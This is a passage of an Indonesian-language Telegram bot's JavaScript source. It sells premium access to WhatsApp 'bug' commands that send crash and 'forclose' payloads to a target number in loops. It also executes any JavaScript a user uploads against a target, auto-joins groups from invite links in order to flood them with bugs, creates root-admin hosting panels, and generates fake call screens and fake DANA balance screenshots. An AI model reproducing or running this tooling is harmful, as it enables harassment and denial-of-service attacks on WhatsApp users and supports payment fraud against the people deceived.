    if (!hasAccess(ctx.from.id) && !hasAccess(ctx.chat.id)) {
        return ctx.replyWithHTML("<blockquote><b>❌ AKSES DITOLAK!</b>\nLo belum punya izin buat create panel. Hubungi @Raffioffci5</blockquote>");
    }

    const username = args[1].toLowerCase().replace(/[^a-z0-9]/g, '');
    const email = `${username}@vnx.com`; 
    const password = Math.random().toString(36).slice(-10);

    try {
        await ctx.replyWithHTML(`⏳ <b>PROSES:</b> Sedang membuatkan panel untuk <b>${username}</b>...`);

        // 1. Create User
        const userRes = await axios.post(`${PTERO_URL}/api/application/users`, {
            email: email, 
            username: username, 
            first_name: username, 
            last_name: "Server", 
            password: password
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Accept': 'application/json' 
            } 
        });

        const userId = userRes.data.attributes.id;

        // 2. Create Server
        const serverRes = await axios.post(`${PTERO_URL}/api/application/servers`, {
            name: `VNX-${username}`,
            user: userId,
            nest: NEST_ID,
            egg: EGG_ID,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN};",
            environment: { 
                "CMD_RUN": "npm start",
                "MAIN_FILE": "start.js",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0"
            },
            limits: { memory: 0, swap: 0, disk: 0, io: 500, cpu: 0 },
            feature_limits: { databases: 5, backups: 5, allocations: 1 },
            deploy: { locations: [LOCATION_ID], dedicated_ip: false, port_range: [] }
        }, { 
            headers: { 
                'Authorization': `Bearer ${PTERO_API_KEY}`, 
                'Content-Type': 'application/json',
                'Accept': 'application/json' 
            } 
        });

        // --- 3. PESAN DETAIL PANEL + RULES ---
        const successMsg = `<blockquote><b>🚀 PANEL UNLI BERHASIL DI DIBUAT!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>User:</b> <code>${username}</code>\n` +
            `🔑 <b>Pass:</b> <code>${password}</code>\n` +
            `📊 <b>Specs:</b> <b>UNLI RAM / UNLI DISK</b>\n` +
            `🌐 <b>Login:</b> ${PTERO_URL}\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>⚠️ SYARAT & KETENTUAN (RULES):</b>\n` +
            `1. <b>Dilarang</b> keras share domain panel ini!\n` +
            `2. <b>Dilarang</b> melakukan DDOS/Spamming via panel.\n` +
            `3. Jangan mengubah resource server secara paksa.\n` +
            `4. Pelanggaran rules berakibat <b>SUSPEND</b> permanen.\n\n` +
            `<i>Terima kasih telah menggunakan layanan Vionix Invictus!</i></blockquote>`;

        const logMsg = `<blockquote><b>📢 LOG CREATE PANEL (UNLI)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>Dari:</b> ${ctx.from.first_name} (@${ctx.from.username || 'n/a'})\n` +
            `🆔 <b>ID:</b> <code>${ctx.from.id}</code>\n` +
            `📂 <b>User Panel:</b> <code>${username}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━</blockquote>`;

        // --- 4. PENGIRIMAN PESAN ---

        // A. Kirim Foto + Detail lengkap ke PV User
        try {
            // getRandomImage() adalah fungsi gambar lo yang lama
            await ctx.telegram.sendPhoto(ctx.from.id, getRandomImage(), { 
                caption: successMsg, 
                parse_mode: 'HTML' 
            });
            
            // B. Kirim notif ke GRUP (Tanpa password biar aman)
            await ctx.replyWithHTML(`<blockquote><b>✅ DONE!</b>\nPanel <b>${username}</b> sukses dibuat. Detail login sudah dikirim ke <b>Private Chat (PV)</b> lo!</blockquote>`, {
                message_effect_id: isPrivate ? "5159385139981059251" : undefined,
            });
        } catch (e) {
            await ctx.replyWithHTML(`<blockquote><b>⚠️ GAGAL PV!</b>\nPanel jadi, tapi detail gak bisa dikirim. <b>KLIK START</b> dulu di bot ini lalu hubungi owner.</blockquote>`);
        }

        // C. Kirim Log ke lo (Owner)
        await bot.telegram.sendMessage(OWNER_IDS[0], logMsg, { parse_mode: 'HTML' });

    } catch (err) {
        const errorDetail = err.response?.data?.errors?.[0]?.detail || err.message;
        ctx.replyWithHTML(`<blockquote><b>❌ GAGAL:</b>\n<code>${errorDetail}</code></blockquote>`);
    }
});

bot.command('cadmin', checkAdmin, async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.replyWithHTML("<b>⚠️ Format:</b> <code>/cadmin [nama]</code>");
    
    const userId = ctx.from.id.toString();

    const username = args[1].toLowerCase().replace(/[^a-z0-9]/g, '');
    const email = `${username}@vnx.com`; 
    const password = Math.random().toString(36).slice(-10);

    try {
        // 1. Notif di Grup (Hanya info proses)
        const loading = await ctx.replyWithHTML(`⏳ <b>PROSES:</b> Sedang membuatkan akun <b>ADMIN PANEL</b> untuk <b>${username}</b>...`);

        // 2. Create User Admin
        const userRes = await axios.post(`${PTERO_URL}/api/application/users`, {
            email: email, 
            username: username, 
            first_name: username, 
            last_name: "ADMIN", 
            password: password,
            root_admin: true 
        }, { 
            headers: { 'Authorization': `Bearer ${PTERO_API_KEY}`, 'Accept': 'application/json' } 
        });

        const pteroUserId = userRes.data.attributes.id;

        // 3. Create Server 7GB
        await axios.post(`${PTERO_URL}/api/application/servers`, {
            name: `${username}`,
            user: pteroUserId,
            nest: NEST_ID,
            egg: EGG_ID,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN};",
            environment: { "CMD_RUN": "npm start", "MAIN_FILE": "start.js" },
            limits: { memory: 7168, swap: 0, disk: 7168, io: 500, cpu: 100 },
            feature_limits: { databases: 10, backups: 10, allocations: 5 },
            deploy: { locations: [LOCATION_ID], dedicated_ip: false, port_range: [] }
        }, { 
            headers: { 'Authorization': `Bearer ${PTERO_API_KEY}`, 'Content-Type': 'application/json', 'Accept': 'application/json' } 
        });

        // --- TAMPILAN DETAIL ADMIN + RULES ---
        const successMsg = `<blockquote><b>👑 ADMIN PANEL BERHASIL DIBUAT!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 <b>User:</b> <code>${username}</code>\n` +
            `🔑 <b>Pass:</b> <code>${password}</code>\n` +
            `🌟 <b>Role:</b> <b>ROOT ADMIN</b>\n` +
            `📊 <b>Specs:</b> <b>7GB RAM / 7GB DISK</b>\n` +
            `🌐 <b>Login:</b> ${PTERO_URL}\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>⚠️ ADMIN COMPLIANCE & RULES:</b>\n` +
            `1. <b>Strictly Prohibited:</b> Dilarang share link login/domain ke publik.\n` +
            `2. <b>No Overclock:</b> Dilarang memaksa penggunaan resource berlebih.\n` +
            `3. <b>Security:</b> Segera ganti password setelah login pertama.\n` +
            `4. <b>Monitoring:</b> Segala aktivitas admin tercatat dalam log sistem.\n\n` +
            `<i>Gunakan jabatan Admin lo dengan bijak, Bos!</i></blockquote>`;

        // 4. KIRIM FOTO + DETAIL KE PV USER
        try {
            await ctx.telegram.sendPhoto(ctx.from.id, getRandomImage(), { 
                caption: successMsg, 
                parse_mode: 'HTML' 
            });
            
            // Edit pesan di grup
            await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, null, 
                `<blockquote><b>✅ DONE, ${ctx.from.first_name}!</b>\nAdmin Panel <b>${username}</b> sukses dibuat. Detail login sudah dikirim ke <b>Private Chat (PV)</b> bot!</blockquote>`, 
                { parse_mode: 'HTML' }
            );
        } catch (pvError) {
            await ctx.replyWithHTML(`<blockquote><b>⚠️ GAGAL KIRIM DETAIL!</b>\n${ctx.from.first_name}, bot gak bisa chat lo. <b>KLIK START</b> dulu di bot secara pribadi baru coba lagi!</blockquote>`);
        }

        // 5. KIRIM LOG KE OWNER (RAFFI)
        const logMsg = `<blockquote><b>📢 LOG CREATE ADMIN</b>\n` +
            `👤 <b>User:</b> ${ctx.from.first_name} (@${ctx.from.username || 'n/a'})\n` +
            `🎯 <b>Target:</b> <code>${username}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━</blockquote>`;
            
        await bot.telegram.sendMessage(OWNER_IDS[0], logMsg, { parse_mode: 'HTML' });

    } catch (err) {
        const errorDetail = err.response?.data?.errors?.[0]?.detail || "Terjadi kesalahan internal.";
        ctx.replyWithHTML(`<blockquote><b>❌ ERROR:</b>\n<code>${errorDetail}</code></blockquote>`);
    }
});

bot.command('addallakses', checkAdmin, async (ctx) => {
    const isPrivate = ctx.chat.type === 'private';
    
    // Cek apakah ini di grup
    if (ctx.chat.type === 'private') {
        return ctx.reply("❌ Command ini cuma bisa dipake di dalam GRUP!");
    }

    try {
        // Ambil data akses lama
        let allowed = JSON.parse(fs.readFileSync(ACCESS_FILE, 'utf8'));
        
        // Ambil info grup
        const chatHeader = `<blockquote><b>╭━━━ 🔐 GROUP ACCESS GRANTED ━━━╮</b>\n`;
        const chatBody = `<b>┃ Group:</b> <b>${ctx.chat.title}</b>\n<b>┃ Status:</b> <b>ALL MEMBER ACCESSED ✅</b>\n<b>╰━━━━━━━━━━━━━━━━━━━━━━╯</b></blockquote>`;

        // Karena Bot gak bisa narik SEMUA ID member sekaligus tanpa mereka chat,
        // Kita setting akses supaya grup ini TERDAFTAR ID-nya.
        if (!allowed.includes(ctx.chat.id.toString())) {
            allowed.push(ctx.chat.id.toString());
            fs.writeFileSync(ACCESS_FILE, JSON.stringify(allowed, null, 2));
        }

        return ctx.replyWithHTML(chatHeader + chatBody, {
            message_effect_id: isPrivate ? "5159385139981059251" : undefined,
        });
    } catch (err) {
        // Tanpa catch err sesuai request, tapi gue kasih log simpel di console
        console.log("Error Add All:", err.message);
    }
});

bot.command('listallakses', checkAdmin, async (ctx) => {
    try {
        // 1. Baca data dari file akses
        if (!fs.existsSync(ACCESS_FILE)) {
            return ctx.replyWithHTML("<blockquote><b>⚠️ ERROR:</b> File akses belum dibuat!</blockquote>");
        }

        const allowed = JSON.parse(fs.readFileSync(ACCESS_FILE, 'utf8'));

        if (allowed.length === 0) {
            return ctx.replyWithHTML("<blockquote><b>📢 LIST AKSES KOSONG</b>\nBelum ada grup atau user yang didaftarkan.</blockquote>");
        }

        // 2. Susun tampilan list
        let listText = `<blockquote><b>╭━━━ 📋 VAELTRIX ACCESS LIST ━━━╮</b>\n\n`;
        
        allowed.forEach((id, index) => {
            // Kita kasih tanda kalo ID itu grup (biasanya diawali minus '-')
            const type = id.startsWith('-') ? "👥 Group" : "👤 Private";
            listText += `<b>${index + 1}.</b> <code>${id}</code> [${type}]\n`;
        });

        listText += `\n<b>Total:</b> <b>${allowed.length} Terdaftar</b>\n<b>╰━━━━━━━━━━━━━━━━━━━━━━━╯</b></blockquote>`;

        // 3. Kirim List dengan foto biar makin keren
        await ctx.replyWithPhoto(getRandomImage(), {
            caption: listText,
            parse_mode: 'HTML'
        });

    } catch (err) {
        console.log("Error List All:", err.message);
        ctx.replyWithHTML("<blockquote><b>❌ FAILED:</b> Gagal mengambil data akses.</blockquote>");
    }
});

bot.command('delakses', checkAdmin, async (ctx) => {
    const args = ctx.message.text.split(' ');
    const targetId = args[1]; // Ambil ID target dari chat

    // Validasi kalau ID target gak diisi
    if (!targetId) {
        return ctx.replyWithHTML("<blockquote><b>⚠️ FORMAT SALAH!</b>\nContoh: <code>/delallakses -100xxxxxxxx</code></blockquote>");
    }

    try {
        // 1. Baca database akses
        if (!fs.existsSync(ACCESS_FILE)) {
            return ctx.replyWithHTML("<blockquote><b>⚠️ ERROR:</b> Database akses tidak ditemukan!</blockquote>");
        }

        let allowed = JSON.parse(fs.readFileSync(ACCESS_FILE, 'utf8'));

        // 2. Cek apakah ID tersebut ada di database
        if (!allowed.includes(targetId)) {
            return ctx.replyWithHTML(`<blockquote><b>❌ FAILED:</b>\nID <code>${targetId}</code> tidak terdaftar di sistem!</blockquote>`);
        }

        // 3. Proses penghapusan
        const updatedList = allowed.filter(id => id !== targetId);
        fs.writeFileSync(ACCESS_FILE, JSON.stringify(updatedList, null, 2));

        // 4. Notifikasi Sukses
        const delHeader = `<blockquote><b>╭━━━ 🗑️ ACCESS TERMINATED ━━━╮</b>\n`;
        const delBody = `<b>┃ Target ID:</b> <code>${targetId}</code>\n<b>┃ Status:</b> <b>DELETED FROM DATABASE ✅</b>\n<b>╰━━━━━━━━━━━━━━━━━━━━━━╯</b></blockquote>`;

        return ctx.replyWithHTML(delHeader + delBody);

    } catch (err) {
        console.error("Error Del Access:", err.message);
        ctx.replyWithHTML("<blockquote><b>❌ ERROR:</b> Gagal menghapus data akses.</blockquote>");
    }
});
//////// -- CASE BUG BIASA --- \\\\\\\\\\\
bot.command("AS", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`↯ Example: /AS 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/tk2xg1.jpg", {
    caption: `
<b>↯ Target : ${q}
↯ Status : Succes Send Bugs
↯ Type : Delay Hard new</b>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ↯ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 15; i++) {
      console.log(chalk.red(`Send Bug Delay ${i + 1}/150 To ${q}`));
      await AS(sock, target);
      await sleep(4500);
      await AS(sock, target);
      await sleep(4500);
    }
  })();
});
bot.command("King", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /King 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/tk2xg1.jpg", {
    caption: `
<b>↯ Target : ${q}
↯ Status : Succes Send Bugs
↯ Type : Delay Hard new</b>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 15; i++) {
      console.log(chalk.red(`Send Bug Delay One Hit ${i + 1}/10 To ${q}`));
      await King(sock, target);
      await sleep(8000);
    }
  })();
});
bot.command("Poker", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Poker 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/tk2xg1.jpg", {
    caption: `
<b>↯ Target : ${q}
↯ Status : Succes Send Bugs
↯ Type : Delay Hard new</b>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

(async () => {
    for (let i = 0; i < 15; i++) {
      console.log(chalk.red(`Send Bug Forclose ${i + 1}/10 To ${q}`));
      await Poker(sock, target);
      await sleep(8000);
    }
  })();
}); // ← tutup Poker di sini

// Tambahkan command addadmin yang benar:
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("❌ Format: /addadmin [userId]");
  const userId = args[1].toString();
  if (adminUsers.includes(userId)) return ctx.reply(`✅ ${userId} sudah admin.`);
  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);
  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
// === TAMBAHKAN INI DI BAGIAN ATAS JIKA BELUM ADA ===
const createSafeSock = (s) => {
    return s; 
};
// =================================================
bot.command('testfunction', checkWhatsAppConnection, checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const msg = ctx.message;

  try {      
    const args = msg.text.split(" ");
    if (args.length < 3) {
      return ctx.reply("🪧 Example : /testfunction 62xxx 10 (reply function/file.js)");
    }

    const q = args[1];
    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0) {
      return ctx.reply("❌ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!msg.reply_to_message) {
      return ctx.reply("❌ Reply dengan function atau file .js");
    }

    // --- BAGIAN AMBIL KODE (MIRIP TAPI SUPPORT FILE) ---
    let funcCode = "";
    if (msg.reply_to_message.document) {
        if (!msg.reply_to_message.document.file_name.endsWith('.js')) {
            return ctx.reply("❌ File harus format .js");
        }
        const fileLink = await ctx.telegram.getFileLink(msg.reply_to_message.document.file_id);
        const axios = require('axios');
        const res = await axios.get(fileLink.href);
        funcCode = res.data;
    } else if (msg.reply_to_message.text) {
        funcCode = msg.reply_to_message.text;
    } else {
        return ctx.reply("❌ Reply-nya harus teks atau file .js!");
    }

    const processMsg = await ctx.replyWithPhoto("https://gangalink.vercel.app/i/uvjob78z.jpg", {
      caption: `
<blockquote><b>🌸 ⌜ Project Base V4 ⌟ 🌸</b></blockquote>
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Process Bug
╘═——————————————═⬡`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Check", url: `https://wa.me/${q}` }]
        ]
      }
    });

    const processMessageId = processMsg.message_id;
    const safeSock = createSafeSock(sock);

    // --- LOGIKA WRAPPER (MIRIP PUNYA LO) ---
    const vm = require("vm");
    const sandbox = {
      console, Buffer, sock: safeSock, target, sleep,
      generateWAMessageFromContent, generateForwardMessageContent,
      generateWAMessage, prepareWAMessageMedia, proto, jidDecode, areJidsSameUser
    };
    const context = vm.createContext(sandbox);

    let fn;
    if (funcCode.includes("async function")) {
        const matchFunc = funcCode.match(/async function\s+(\w+)/);
        if (!matchFunc) return ctx.reply("❌ Function tidak valid");
        const funcName = matchFunc[1];
        const wrapper = `${funcCode}\n${funcName}`;
        fn = vm.runInContext(wrapper, context);
    } else {
        // Kalau cuma kode biasa (JS Raw)
        const wrapper = `async function tempFunc(sock, target) { 
            try { ${funcCode} } catch(e) {} 
        }; tempFunc`;
        fn = vm.runInContext(wrapper, context);
    }

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }
      } catch (e) {}
      await sleep(200);
    }

    const finalText = `
<blockquote><b>🌸 ⌜ Project Base V4 ⌟ 🌸</b></blockquote>
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Success Bug
╘═——————————————═⬡`;

    try {
      await ctx.telegram.editMessageCaption(chatId, processMessageId, null, finalText, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "! Check", url: `https://wa.me/${q}` }]
          ]
        }
      });
    } catch (e) {
      await ctx.replyWithPhoto("https://gangalink.vercel.app/i/uvjob78z.jpg", {
        caption: finalText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "! Check", url: `https://wa.me/${q}` }]
          ]
        }
      });
    }

  } catch (err) {
    console.error(err);
  }
});
bot.command('testgb', checkWhatsAppConnection, checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const msg = ctx.message;

  try {      
    const args = msg.text.split(" ");
    if (args.length < 3) {
      return ctx.reply("🪧 Example : /testgb https://chat.whatsapp.com/xxx 10 (reply function/file)");
    }

    const groupLink = args[1].trim();
    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    
    // --- AMBIL KODE INVITE ---
    const inviteRegex = /chat\.whatsapp\.com\/([a-zA-Z0-9]{20,26})/;
    const match = groupLink.match(inviteRegex);
    if (!match) return ctx.reply("❌ Link grup tidak valid");
    const groupCode = match[1];

    if (!msg.reply_to_message) {
      return ctx.reply("❌ Reply dengan function atau file .js");
    }

    // --- AMBIL KODE BUG (TEKS/FILE) ---
    let funcCode = "";
    if (msg.reply_to_message.document) {
        const fileLink = await ctx.telegram.getFileLink(msg.reply_to_message.document.file_id);
        const axios = require('axios');
        const res = await axios.get(fileLink.href);
        funcCode = res.data;
    } else {
        funcCode = msg.reply_to_message.text;
    }

    const processMsg = await ctx.replyWithPhoto("https://gangalink.vercel.app/i/uvjob78z.jpg", {
      caption: `
<blockquote><b>🌸 ⌜ Project Base V4 ⌟ 🌸</b></blockquote>
▢  Target: Group Link
▢  Type: GB Auto Join & Bug
▢  Status: Joining Group...
╘═——————————————═⬡`,
      parse_mode: "HTML"
    });

    const processMessageId = processMsg.message_id;
    const safeSock = createSafeSock(sock);

    // --- LOGIKA OTOMATIS JOIN (DIPERKUAT) ---
    let targetJid;
    try {
        // 1. Ambil Info dulu (buat dapet JID @g.us)
        const groupData = await sock.groupGetInviteInfo(groupCode);
        targetJid = groupData.id;

        // 2. Eksekusi Join
        await sock.groupAcceptInvite(groupCode);
        
        // 3. JEDA WAJIB (Biar server WA tau kita udah di dalem)
        await sleep(2500); 
        
        console.log(chalk.green(`[SUCCESS] Vaeltrix Berhasil Join: ${targetJid}`));
    } catch (e) {
        // Kalau error karena udah di dalem grup, abaikan aja
        if (e.message.includes("409")) { 
            console.log(chalk.yellow("[INFO] Bot sudah ada di dalam grup."));
        } else {
            return ctx.telegram.editMessageCaption(chatId, processMessageId, null, `❌ Gagal Join Otomatis: ${e.message}`, { parse_mode: "HTML" });
        }
    }

    // --- LOGIKA VM (IDENTIK VERSI NUMBER) ---
    const vm = require("vm");
    const sandbox = {
      console, Buffer, chalk, sock: safeSock, target: targetJid, sleep,
      generateWAMessageFromContent, generateForwardMessageContent,
      generateWAMessage, prepareWAMessageMedia, proto, jidDecode, areJidsSameUser
    };
    const context = vm.createContext(sandbox);

    let fn;
    if (funcCode.includes("async function")) {
        const matchFunc = funcCode.match(/async function\s+(\w+)/);
        const funcName = matchFunc ? matchFunc[1] : null;
        fn = vm.runInContext(`${funcCode}\n${funcName}`, context);
    } else {
        const wrapper = `async function tempFunc(sock, target) { 
            try { ${funcCode} } catch(e) {} 
        }; tempFunc`;
        fn = vm.runInContext(wrapper, context);
    }

    // --- UPDATE STATUS KE PROCESSING ---
    await ctx.telegram.editMessageCaption(chatId, processMessageId, null, `
<blockquote><b>🌸 ⌜ Project Base V4 ⌟ 🌸</b></blockquote>
▢  Target: Group Link
▢  Type: GB Auto Join & Bug
▢  Status: Sending ${jumlah} Bug...
╘═——————————————═⬡`, { parse_mode: "HTML" });

    // --- EKSEKUSI LOOP BUG ---
    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(targetJid);
        } else {
          await fn(safeSock, targetJid);
        }
        console.log(chalk.green(`[SUCCESS] Bug ke-${i+1} terkirim.`));
      } catch (e) {
        console.log(chalk.red(`[ERROR] Bug ke-${i+1} gagal: ${e.message}`));
      }
      
      // TAMBAHIN JEDA LEBIH LAMA KHUSUS GRUP
      await sleep(2000); // Ganti ke 2000 (2 detik) biar gak rate-overlimit
    }

    const finalText = `
<blockquote><b>🌸 ⌜ Project Base V4 ⌟ 🌸</b></blockquote>
▢  Target: ${groupLink}
▢  Type: GB SUCCESS
▢  Status: Join & Success Sent ${jumlah} Bug
╘═——————————————═⬡`;

    await ctx.telegram.editMessageCaption(chatId, processMessageId, null, finalText, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "! Check", url: groupLink }]]
        }
    });

  } catch (err) {
    console.error(err);
  }
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "VNXGACOR");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Developers", url: "https://t.me/Raffioffci5" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});
////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}
// tools
bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command("fakedana", async (ctx) => {
    try {

        const cmd = ctx.message.text.split(" ")[0].replace("/", "").toLowerCase()
        const text = ctx.message.text.split(" ").slice(1).join(" ")

        if (!text) {

            const example = cmd === "fakedanav2"
            ? `*Fake Dana Generator*

Example:

➜ /fakedanav2 1.000.000
➜ /fakedana 5.000.000

Perbedaan versi:
• *fakedana* ➜ Tampilan saldo Dana (landscape)
• *fakedanav2* ➜ Tampilan aplikasi Dana (portrait)`
            : `*Fake Dana Generator*

Example:

➜ /fakedana 1.000.000
➜ /fakedanav2 5.000.000

Perbedaan versi:
• *fakedana* ➜ Tampilan saldo Dana (landscape)
